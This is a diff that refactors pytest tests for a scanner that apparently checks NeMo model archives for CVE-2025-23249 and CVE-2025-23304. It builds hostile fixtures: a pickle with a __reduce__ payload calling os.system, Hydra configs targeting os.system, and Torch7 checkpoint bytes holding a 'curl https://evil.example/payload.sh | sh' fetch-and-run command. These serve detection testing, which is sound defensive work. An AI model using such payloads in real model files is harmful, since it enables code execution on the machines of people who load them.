@@ -15,6 +15,8 @@ from typing import Any, Literal
 
 import pytest
 
+from tests.helpers.file_creators import SystemCommandPayload
+
 try:
     import yaml
 
@@ -220,11 +222,7 @@ def _materialize_tmp_paths(value: Any, tmp_path: Path) -> Any:
 def _build_malicious_pickle() -> bytes:
     import os as os_module
 
-    class DangerousPayload:
-        def __reduce__(self) -> tuple[Any, tuple[str]]:
-            return (os_module.system, ("echo nemo-checkpoint-test",))
-
-    return pickle.dumps(DangerousPayload())
+    return pickle.dumps(SystemCommandPayload("echo nemo-checkpoint-test", lambda: os_module.system))
 
 
 class TestNemoScannerBasic:
@@ -1425,40 +1423,24 @@ class TestNemoArchiveVulnerabilityCoverage:
         assert cve_checks[0].severity == IssueSeverity.CRITICAL
 
     def test_torch7_checkpoint_with_pt_suffix_detects_nemo_deserialization_cve(self, tmp_path: Path) -> None:
-        nemo_path = tmp_path / "torch7-checkpoint-rce.nemo"
-        torch7_payload = (
-            b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
-            b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
-            b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
+        _assert_nemo_torch7_checkpoint_cve(
+            tmp_path,
+            ("torch7-checkpoint-rce.nemo"),
+            (
+                b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
+                b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
+                b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
+            ),
         )
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
-            _add_tar_bytes(tar, "model_weights.pt", torch7_payload)
-
-        result = NemoScanner().scan(str(nemo_path))
-
-        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-23249"]
-        assert len(cve_checks) == 1
-        assert cve_checks[0].severity == IssueSeverity.CRITICAL
-        assert cve_checks[0].details["nested_scanner"] == "torch7"
 
     def test_marker_form_torch7_checkpoint_with_pt_suffix_detects_nemo_deserialization_cve(
         self, tmp_path: Path
     ) -> None:
-        nemo_path = tmp_path / "marker-torch7-checkpoint-rce.nemo"
-        torch7_payload = (
-            b"\x01\x00torch.FloatTensor nn.Sequential os.execute('curl https://evil.example/payload.sh | sh')\n"
+        _assert_nemo_torch7_checkpoint_cve(
+            tmp_path,
+            ("marker-torch7-checkpoint-rce.nemo"),
+            (b"\x01\x00torch.FloatTensor nn.Sequential os.execute('curl https://evil.example/payload.sh | sh')\n"),
         )
-        with tarfile.open(nemo_path, "w") as tar:
-            _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
-            _add_tar_bytes(tar, "model_weights.pt", torch7_payload)
-
-        result = NemoScanner().scan(str(nemo_path))
-
-        cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-23249"]
-        assert len(cve_checks) == 1
-        assert cve_checks[0].severity == IssueSeverity.CRITICAL
-        assert cve_checks[0].details["nested_scanner"] == "torch7"
 
     def test_duplicate_checkpoint_replacement_detects_nemo_deserialization_cve(self, tmp_path: Path) -> None:
         nemo_path = tmp_path / "duplicate-checkpoint-rce.nemo"
@@ -3065,38 +3047,10 @@ class TestCVE202523304HydraTarget:
         assert any(issue.severity == IssueSeverity.CRITICAL for issue in directory.issues)
 
     def test_core_routes_gzip_wrapped_renamed_nemo_archive(self, tmp_path: Path) -> None:
-        path = tmp_path / "compressed.jpg"
-        with tarfile.open(path, "w:gz") as archive:
-            _add_tar_bytes(archive, "model_config.yaml", b"model:\n  _target_: os.system\n  command: echo pwned\n")
-
-        result = scan_file(str(path), config={"cache_scan_results": False})
-
-        assert result.scanner_name == "nemo"
-        assert any(
-            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
-            and check.status == CheckStatus.FAILED
-            and check.details["target"] == "os.system"
-            for check in result.checks
-        )
+        _assert_core_routes_renamed_nemo(tmp_path, ("compressed.jpg"), ("w:gz"), ("model_config.yaml"))
 
     def test_core_routes_normalized_root_config_in_renamed_nemo_archive(self, tmp_path: Path) -> None:
-        path = tmp_path / "normalized-config.jpg"
-        with tarfile.open(path, "w") as archive:
-            _add_tar_bytes(
-                archive,
-                "configs/../model_config.yaml",
-                b"model:\n  _target_: os.system\n  command: echo pwned\n",
-            )
-
-        result = scan_file(str(path), config={"cache_scan_results": False})
-
-        assert result.scanner_name == "nemo"
-        assert any(
-            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
-            and check.status == CheckStatus.FAILED
-            and check.details["target"] == "os.system"
-            for check in result.checks
-        )
+        _assert_core_routes_renamed_nemo(tmp_path, ("normalized-config.jpg"), ("w"), ("configs/../model_config.yaml"))
 
     @pytest.mark.parametrize("link_type", [tarfile.SYMTYPE, tarfile.LNKTYPE])
     @pytest.mark.parametrize(
@@ -4162,22 +4116,7 @@ class TestCVE202523304HydraTarget:
         tmp_path: Path,
         monkeypatch: pytest.MonkeyPatch,
     ) -> None:
-        monkeypatch.setattr(file_detection, "_NEMO_ROUTE_MAX_ENTRIES", 3)
-        path = tmp_path / "late-config.jpg"
-        with tarfile.open(path, "w") as archive:
-            _add_tar_bytes(archive, "assets/one.bin", b"one")
-            _add_tar_bytes(archive, "assets/two.bin", b"two")
-            _add_tar_bytes(archive, "model_config.yaml", b"model:\n  _target_: os.system\n  command: echo pwned\n")
-
-        result = scan_file(str(path), config={"cache_scan_results": False})
-
-        assert result.scanner_name == "nemo"
-        assert any(
-            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
-            and check.status == CheckStatus.FAILED
-            and check.details["target"] == "os.system"
-            for check in result.checks
-        )
+        _assert_nemo_root_config_scan(tmp_path, monkeypatch, (3), ("late-config.jpg"))
 
     @pytest.mark.parametrize(
         ("target", "expected_success", "expected_exit_code"),
@@ -4794,22 +4733,7 @@ class TestCVE202523304HydraTarget:
         tmp_path: Path,
         monkeypatch: pytest.MonkeyPatch,
     ) -> None:
-        monkeypatch.setattr(file_detection, "_NEMO_ROUTE_MAX_ENTRIES", 2)
-        path = tmp_path / "declared.nemo"
-        with tarfile.open(path, "w") as archive:
-            _add_tar_bytes(archive, "assets/one.bin", b"one")
-            _add_tar_bytes(archive, "assets/two.bin", b"two")
-            _add_tar_bytes(archive, "model_config.yaml", b"model:\n  _target_: os.system\n  command: echo pwned\n")
-
-        result = scan_file(str(path), config={"cache_scan_results": False})
-
-        assert result.scanner_name == "nemo"
-        assert any(
-            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
-            and check.status == CheckStatus.FAILED
-            and check.details["target"] == "os.system"
-            for check in result.checks
-        )
+        _assert_nemo_root_config_scan(tmp_path, monkeypatch, (2), ("declared.nemo"))
 
     def test_nested_renamed_nemo_member_detects_dangerous_target(self, tmp_path: Path) -> None:
         member_path = _create_nemo_file(
@@ -5866,17 +5790,7 @@ class TestCVE202523304HydraTarget:
     )
     def test_additional_immediate_io_targets_are_dangerous(self, tmp_path: Path, target: str) -> None:
         """Immediate I/O aliases in covered sink families must not remain INFO-only."""
-        path = _create_nemo_file(tmp_path, {"model": {"_target_": target}})
-
-        result = NemoScanner().scan(str(path))
-
-        assert any(
-            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
-            and check.status == CheckStatus.FAILED
-            and check.severity == IssueSeverity.CRITICAL
-            and check.details.get("target") == target
-            for check in result.checks
-        )
+        _assert_hydra_target_critical(tmp_path, target)
 
     @pytest.mark.parametrize(
         "target",
@@ -5887,32 +5801,12 @@ class TestCVE202523304HydraTarget:
     )
     def test_non_io_omegaconf_targets_remain_safe(self, tmp_path: Path, target: str) -> None:
         """Exact OmegaConf I/O overrides must not invalidate the broader safe namespace."""
-        path = _create_nemo_file(tmp_path, {"model": {"_target_": target}})
-
-        result = NemoScanner().scan(str(path))
-
-        assert not any(check.name.startswith("CVE-2025-23304") for check in result.checks)
-        assert any(
-            check.name == "Hydra _target_ Safety Check"
-            and check.status == CheckStatus.PASSED
-            and check.details.get("target") == target
-            for check in result.checks
-        )
+        _assert_hydra_target_safe(tmp_path, target)
 
     def test_transformers_factory_without_loading_remains_safe(self, tmp_path: Path) -> None:
         """The from_pretrained override must not invalidate safe Transformers factories."""
         target = "transformers.AutoModel"
-        path = _create_nemo_file(tmp_path, {"model": {"_target_": target}})
-
-        result = NemoScanner().scan(str(path))
-
-        assert not any(check.name.startswith("CVE-2025-23304") for check in result.checks)
-        assert any(
-            check.name == "Hydra _target_ Safety Check"
-            and check.status == CheckStatus.PASSED
-            and check.details.get("target") == target
-            for check in result.checks
-        )
+        _assert_hydra_target_safe(tmp_path, target)
 
     @pytest.mark.parametrize(
         "target",
@@ -6012,17 +5906,7 @@ class TestCVE202523304HydraTarget:
     )
     def test_safe_namespace_side_effect_targets_are_dangerous(self, tmp_path: Path, target: str) -> None:
         """Broad trusted namespaces must not hide import, global-state, network, or file side effects."""
-        path = _create_nemo_file(tmp_path, {"model": {"_target_": target}})
-
-        result = NemoScanner().scan(str(path))
-
-        assert any(
-            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
-            and check.status == CheckStatus.FAILED
-            and check.severity == IssueSeverity.CRITICAL
-            and check.details.get("target") == target
-            for check in result.checks
-        )
+        _assert_hydra_target_critical(tmp_path, target)
 
     @pytest.mark.parametrize(
         "target",
@@ -6046,17 +5930,7 @@ class TestCVE202523304HydraTarget:
     )
     def test_safe_namespace_side_effect_near_matches_remain_safe(self, tmp_path: Path, target: str) -> None:
         """Exact helpers and method suffixes must not promote similarly named safe-namespace callables."""
-        path = _create_nemo_file(tmp_path, {"model": {"_target_": target}})
-
-        result = NemoScanner().scan(str(path))
-
-        assert not any(check.name.startswith("CVE-2025-23304") for check in result.checks)
-        assert any(
-            check.name == "Hydra _target_ Safety Check"
-            and check.status == CheckStatus.PASSED
-            and check.details.get("target") == target
-            for check in result.checks
-        )
+        _assert_hydra_target_safe(tmp_path, target)
 
     @pytest.mark.parametrize(
         ("target", "target_config", "expected_argument", "expected_reason"),
@@ -6599,15 +6473,7 @@ class TestCVE202523304HydraTarget:
     )
     def test_safe_namespace_side_effect_targets_fail_aggregate_scan(self, tmp_path: Path, target: str) -> None:
         """Representative trusted-namespace side effects must retain security exit-code precedence."""
-        path = _create_nemo_file(tmp_path, {"model": {"_target_": target}})
-
-        result = scan_model_directory_or_file(str(path), config={"cache_scan_results": False})
-
-        assert any(
-            issue.severity == IssueSeverity.CRITICAL and issue.details.get("target") == target
-            for issue in result.issues
-        )
-        assert determine_exit_code(result) == 1
+        _assert_hydra_aggregate_critical(tmp_path, target)
 
     @pytest.mark.parametrize(
         "target",
@@ -6707,20 +6573,7 @@ class TestCVE202523304HydraTarget:
     )
     def test_reviewed_constructor_and_loader_aliases_are_dangerous(self, tmp_path: Path, target: str) -> None:
         """Immediate network, file, and native-loader aliases must fail security review."""
-        path = _create_nemo_file(tmp_path, {"model": {"_target_": target}})
-
-        result = NemoScanner().scan(str(path))
-
-        assert any(
-            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
-            and check.status == CheckStatus.FAILED
-            and check.severity == IssueSeverity.CRITICAL
-            and check.details.get("target") == target
-            for check in result.checks
-        )
-        assert not any(
-            check.name == "Hydra _target_ Review" and check.details.get("target") == target for check in result.checks
-        )
+        _assert_hydra_target_critical_without_review(tmp_path, target)
 
     @pytest.mark.parametrize(
         "target",
@@ -6742,20 +6595,7 @@ class TestCVE202523304HydraTarget:
         target: str,
     ) -> None:
         """Immediate filesystem, network, and process-backed aliases must fail security review."""
-        path = _create_nemo_file(tmp_path, {"model": {"_target_": target}})
-
-        result = NemoScanner().scan(str(path))
-
-        assert any(
-            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
-            and check.status == CheckStatus.FAILED
-            and check.severity == IssueSeverity.CRITICAL
-            and check.details.get("target") == target
-            for check in result.checks
-        )
-        assert not any(
-            check.name == "Hydra _target_ Review" and check.details.get("target") == target for check in result.checks
-        )
+        _assert_hydra_target_critical_without_review(tmp_path, target)
 
     @pytest.mark.parametrize(
         "target",
@@ -6793,18 +6633,7 @@ class TestCVE202523304HydraTarget:
     )
     def test_constructor_and_loader_near_matches_remain_review_only(self, tmp_path: Path, target: str) -> None:
         """Exact alias coverage should not promote similarly named custom factories."""
-        path = _create_nemo_file(tmp_path, {"model": {"_target_": target}})
-
-        result = NemoScanner().scan(str(path))
-
-        assert not any(check.name.startswith("CVE-2025-23304") for check in result.checks)
-        assert any(
-            check.name == "Hydra _target_ Review"
-            and check.status == CheckStatus.FAILED
-            and check.severity == IssueSeverity.INFO
-            and check.details.get("target") == target
-            for check in result.checks
-        )
+        _assert_hydra_target_review_only(tmp_path, target)
 
     @pytest.mark.parametrize(
         ("target", "target_config"),
@@ -7130,15 +6959,7 @@ class TestCVE202523304HydraTarget:
     )
     def test_additional_immediate_io_targets_fail_aggregate_scan(self, tmp_path: Path, target: str) -> None:
         """Representative added I/O aliases should retain security exit-code precedence."""
-        path = _create_nemo_file(tmp_path, {"model": {"_target_": target}})
-
-        result = scan_model_directory_or_file(str(path), config={"cache_scan_results": False})
-
-        assert any(
-            issue.severity == IssueSeverity.CRITICAL and issue.details.get("target") == target
-            for issue in result.issues
-        )
-        assert determine_exit_code(result) == 1
+        _assert_hydra_aggregate_critical(tmp_path, target)
 
     @pytest.mark.parametrize(
         "target",
@@ -7289,20 +7110,7 @@ class TestCVE202523304HydraTarget:
     )
     def test_process_and_global_side_effect_aliases_are_dangerous(self, tmp_path: Path, target: str) -> None:
         """Exact process and cwd side effects should not fall through to INFO-only review."""
-        path = _create_nemo_file(tmp_path, {"model": {"_target_": target}})
-
-        result = NemoScanner().scan(str(path))
-
-        assert any(
-            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
-            and check.status == CheckStatus.FAILED
-            and check.severity == IssueSeverity.CRITICAL
-            and check.details.get("target") == target
-            for check in result.checks
-        )
-        assert not any(
-            check.name == "Hydra _target_ Review" and check.details.get("target") == target for check in result.checks
-        )
+        _assert_hydra_target_critical_without_review(tmp_path, target)
 
     @pytest.mark.parametrize(
         "target",
@@ -7343,18 +7151,7 @@ class TestCVE202523304HydraTarget:
     )
     def test_execution_alias_near_matches_remain_review_only(self, tmp_path: Path, target: str) -> None:
         """Exact alias coverage should not promote similarly named custom factories."""
-        path = _create_nemo_file(tmp_path, {"model": {"_target_": target}})
-
-        result = NemoScanner().scan(str(path))
-
-        assert not any(check.name.startswith("CVE-2025-23304") for check in result.checks)
-        assert any(
-            check.name == "Hydra _target_ Review"
-            and check.status == CheckStatus.FAILED
-            and check.severity == IssueSeverity.INFO
-            and check.details.get("target") == target
-            for check in result.checks
-        )
+        _assert_hydra_target_review_only(tmp_path, target)
 
     def test_unknown_request_named_custom_target_remains_review_only(self, tmp_path: Path) -> None:
         """Exact sink coverage should not promote benign request-like custom factories."""
@@ -7809,14 +7606,7 @@ class TestCVE202523304HydraTarget:
 
     def test_suspicious_target_with_numeric_suffix_detected(self, tmp_path: Path) -> None:
         """Suffix-number variants like eval2 should still be treated as suspicious."""
-        config = {"model": {"_target_": "custom_module.eval2"}}
-        path = _create_nemo_file(tmp_path, config)
-
-        result = NemoScanner().scan(str(path))
-
-        suspicious_checks = [c for c in result.checks if c.name == "CVE-2025-23304: Suspicious Hydra _target_"]
-        assert len(suspicious_checks) == 1
-        assert suspicious_checks[0].details["pattern"] == "eval"
+        _assert_nemo_suspicious_target(tmp_path, ("custom_module.eval2"), ("eval"))
 
     def test_benign_embedded_keyword_target_is_review_only(self, tmp_path: Path) -> None:
         """Benign near-match words like 'systematic' should not trigger CVE-2025-23304."""
@@ -7935,16 +7725,7 @@ class TestCVE202523304HydraTarget:
 
     def test_safe_prefix_does_not_suppress_suspicious_leaf_target(self, tmp_path: Path) -> None:
         """Trusted namespaces must not hide obviously dangerous target components."""
-        config = {
-            "model": {"_target_": "nemo.eval_utils.system"},
-        }
-        path = _create_nemo_file(tmp_path, config)
-
-        result = NemoScanner().scan(str(path))
-
-        suspicious_checks = [c for c in result.checks if c.name == "CVE-2025-23304: Suspicious Hydra _target_"]
-        assert len(suspicious_checks) == 1
-        assert suspicious_checks[0].details["pattern"] == "system"
+        _assert_nemo_suspicious_target(tmp_path, ("nemo.eval_utils.system"), ("system"))
 
     def test_safe_prefix_ignores_suspicious_intermediate_component(self, tmp_path: Path) -> None:
         """Namespace segments alone should not make an otherwise safe callable suspicious."""
@@ -8864,3 +8645,139 @@ class TestCVE202523304HydraTarget:
             for check in result.checks
             if check.name == "TAR Aggregate Size Limit Check" and check.status == CheckStatus.FAILED
         ]
+
+
+def _assert_hydra_aggregate_critical(tmp_path: Path, target: str) -> None:
+    path = _create_nemo_file(tmp_path, {"model": {"_target_": target}})
+
+    result = scan_model_directory_or_file(str(path), config={"cache_scan_results": False})
+
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL and issue.details.get("target") == target for issue in result.issues
+    )
+    assert determine_exit_code(result) == 1
+
+
+def _assert_hydra_target_safe(tmp_path: Path, target: str) -> None:
+    path = _create_nemo_file(tmp_path, {"model": {"_target_": target}})
+
+    result = NemoScanner().scan(str(path))
+
+    assert not any(check.name.startswith("CVE-2025-23304") for check in result.checks)
+    assert any(
+        check.name == "Hydra _target_ Safety Check"
+        and check.status == CheckStatus.PASSED
+        and check.details.get("target") == target
+        for check in result.checks
+    )
+
+
+def _assert_hydra_target_critical(tmp_path: Path, target: str) -> None:
+    path = _create_nemo_file(tmp_path, {"model": {"_target_": target}})
+
+    result = NemoScanner().scan(str(path))
+
+    assert any(
+        check.name == "CVE-2025-23304: Dangerous Hydra _target_"
+        and check.status == CheckStatus.FAILED
+        and check.severity == IssueSeverity.CRITICAL
+        and check.details.get("target") == target
+        for check in result.checks
+    )
+
+
+def _assert_hydra_target_review_only(tmp_path: Path, target: str) -> None:
+    path = _create_nemo_file(tmp_path, {"model": {"_target_": target}})
+
+    result = NemoScanner().scan(str(path))
+
+    assert not any(check.name.startswith("CVE-2025-23304") for check in result.checks)
+    assert any(
+        check.name == "Hydra _target_ Review"
+        and check.status == CheckStatus.FAILED
+        and check.severity == IssueSeverity.INFO
+        and check.details.get("target") == target
+        for check in result.checks
+    )
+
+
+def _assert_hydra_target_critical_without_review(tmp_path: Path, target: str) -> None:
+    path = _create_nemo_file(tmp_path, {"model": {"_target_": target}})
+
+    result = NemoScanner().scan(str(path))
+
+    assert any(
+        check.name == "CVE-2025-23304: Dangerous Hydra _target_"
+        and check.status == CheckStatus.FAILED
+        and check.severity == IssueSeverity.CRITICAL
+        and check.details.get("target") == target
+        for check in result.checks
+    )
+    assert not any(
+        check.name == "Hydra _target_ Review" and check.details.get("target") == target for check in result.checks
+    )
+
+
+def _assert_nemo_root_config_scan(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, entry_limit: int, filename: str
+) -> None:
+    monkeypatch.setattr(file_detection, "_NEMO_ROUTE_MAX_ENTRIES", entry_limit)
+    path = tmp_path / filename
+    with tarfile.open(path, "w") as archive:
+        _add_tar_bytes(archive, "assets/one.bin", b"one")
+        _add_tar_bytes(archive, "assets/two.bin", b"two")
+        _add_tar_bytes(archive, "model_config.yaml", b"model:\n  _target_: os.system\n  command: echo pwned\n")
+
+    result = scan_file(str(path), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "nemo"
+    assert any(
+        check.name == "CVE-2025-23304: Dangerous Hydra _target_"
+        and check.status == CheckStatus.FAILED
+        and check.details["target"] == "os.system"
+        for check in result.checks
+    )
+
+
+def _assert_nemo_torch7_checkpoint_cve(tmp_path: Path, filename: str, payload: bytes) -> None:
+    nemo_path = tmp_path / filename
+    torch7_payload = payload
+    with tarfile.open(nemo_path, "w") as tar:
+        _add_tar_bytes(tar, "model_config.yaml", b"model: safe\n")
+        _add_tar_bytes(tar, "model_weights.pt", torch7_payload)
+
+    result = NemoScanner().scan(str(nemo_path))
+
+    cve_checks = [check for check in result.checks if check.details.get("cve_id") == "CVE-2025-23249"]
+    assert len(cve_checks) == 1
+    assert cve_checks[0].severity == IssueSeverity.CRITICAL
+    assert cve_checks[0].details["nested_scanner"] == "torch7"
+
+
+def _assert_core_routes_renamed_nemo(
+    tmp_path: Path, filename: str, archive_mode: Literal["w", "w:gz"], config_member: str
+) -> None:
+    path = tmp_path / filename
+    with tarfile.open(path, archive_mode) as archive:
+        _add_tar_bytes(archive, config_member, b"model:\n  _target_: os.system\n  command: echo pwned\n")
+
+    result = scan_file(str(path), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "nemo"
+    assert any(
+        check.name == "CVE-2025-23304: Dangerous Hydra _target_"
+        and check.status == CheckStatus.FAILED
+        and check.details["target"] == "os.system"
+        for check in result.checks
+    )
+
+
+def _assert_nemo_suspicious_target(tmp_path: Path, target: str, pattern: str) -> None:
+    config = {"model": {"_target_": target}}
+    path = _create_nemo_file(tmp_path, config)
+
+    result = NemoScanner().scan(str(path))
+
+    suspicious_checks = [c for c in result.checks if c.name == "CVE-2025-23304: Suspicious Hydra _target_"]
+    assert len(suspicious_checks) == 1
+    assert suspicious_checks[0].details["pattern"] == pattern
